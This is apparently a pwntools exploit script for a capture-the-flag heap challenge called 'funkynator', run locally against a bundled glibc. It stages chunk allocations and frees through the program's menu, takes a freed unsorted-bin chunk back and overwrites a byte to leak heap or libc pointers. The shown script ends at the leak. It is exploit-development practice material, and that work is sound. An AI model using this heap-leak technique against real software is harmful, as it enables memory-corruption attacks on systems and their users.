#!/usr/bin/env python3
from pwn import *
import struct, time
from pathlib import Path

context.arch = 'amd64'
context.log_level = 'info'

CHALLENGE_DIR = Path('challenge/challenge')
LD_PATH = str((CHALLENGE_DIR / 'glibc' / 'ld-linux-x86-64.so.2').resolve())
BINARY = str(CHALLENGE_DIR.resolve() / 'funkynator')
glibc = str(CHALLENGE_DIR.resolve() / 'glibc')

def connect():
    return process([LD_PATH, BINARY], env={'LD_LIBRARY_PATH': glibc})

def menu(r, choice):
    r.recvuntil(b'> ')
    r.sendline(str(choice).encode())

def create_msg(r, length, content, continue_editor=True):
    """Option 2: create funkified message"""
    menu(r, 2)
    r.recvuntil(b'length:')
    r.sendline(str(length).encode())
    r.recvuntil(b'message:')
    r.sendline(content)
    r.recvuntil(b'?')  # "continue processing?"
    if continue_editor:
        r.sendline(b'y')  # enter editor
    else:
        r.sendline(b'n')  # skip editor

def save_msg(r, slot=None):
    """After editor or skip, handle save_or_free"""
    r.recvuntil(b'memory?')
    if slot is not None:
        r.sendline(b'y')
        r.recvuntil(b'location')
        r.recvuntil(b'\n')  # the "memory was placed in location X" message
    else:
        r.sendline(b'n')

def overwrite_byte(r, offset, value):
    """Editor option 3: overwrite byte"""
    r.sendline(b'3')
    r.recvuntil(b'offset')
    r.sendline(str(offset).encode())
    r.recvuntil(b'with')
    r.send(bytes([value]) + b'\n')
    r.recvuntil(b'> ')  # back to editor menu

def examine_msg(r):
    """Editor option 2: examine message, returns the printed content"""
    r.sendline(b'2')
    r.recvuntil(b'Your message:\n')
    data = r.recvuntil(b'\n+---', drop=True)
    # Now we're back to editor menu, need to consume the separator
    # The output is: "Your message:\n<content>\n+---------------------------+"
    # We already ate up to the start of the separator
    return data

def stop_editor(r):
    """Editor option 1: stop, returns to menu"""
    r.sendline(b'1')
    r.recvuntil(b'message:\n')

def delete_slot(r, slot):
    """Menu option 4: delete message at slot (1-indexed)"""
    menu(r, 4)
    r.recvuntil(b'?\n')
    r.sendline(str(slot).encode())

def view_slot(r, slot):
    """Menu option 3: view message at slot (1-indexed)"""
    menu(r, 3)
    r.recvuntil(b'?\n')
    r.sendline(str(slot).encode())
    data = r.recvuntil(b'\n+---', drop=True)
    return data

r = connect()
r.recvuntil(b'name?')
r.sendline(b'AAAA')
r.recvuntil(b'> ')

# Phase 1: Create a large chunk and free it to unsorted bin
log.info("Creating large message A (0x500)")
create_msg(r, 0x4F0, b'A' * 0x100, continue_editor=False)
save_msg(r, slot=1)  # save to slot 1 (1-indexed)

log.info("Creating guard chunk")
create_msg(r, 0x30, b'G' * 10, continue_editor=False)
save_msg(r, slot=2)  # save to slot 2

log.info("Creating large message B (0x500)")
create_msg(r, 0x4F0, b'B' * 0x100, continue_editor=False)
save_msg(r, slot=3)  # save to slot 3

log.info("Creating top guard chunk")
create_msg(r, 0x30, b'T' * 10, continue_editor=False)
save_msg(r, slot=4)  # save to slot 4

# Delete A (slot 1) → goes to unsorted bin
log.info("Freeing A (slot 1)")
delete_slot(r, 1)

# Delete B (slot 3) → goes to unsorted bin
log.info("Freeing B (slot 3)")
delete_slot(r, 3)

# Now unsorted bin has B ←→ A (consolidated? Hopefully not due to guards)

# Reallocate A's size - should get chunk A back from unsorted bin
log.info("Reallocating (should get chunk A)")
create_msg(r, 0x4F0, b'\n', continue_editor=True)  # enter editor
# Now in editor, msg points to the reallocated chunk (old A)
# Positions 0-1 have '\n' and '\0' from fgets
# Positions 2-7 have old fd/bk data

# Step: Overwrite pos 1 (the null) with 'X'
log.info("Overwriting null at position 1")
overwrite_byte(r, 1, ord('X'))

# Examine the message
log.info("Examining message for leak")
data = examine_msg(r)
log.info(f"Raw examine data: {data.hex()} : {data}")

# Stop editor
stop_editor(r)
# Say no to save (so it doesn't interfere)
save_msg(r, slot=None)  # don't save, free the msg

r.close()
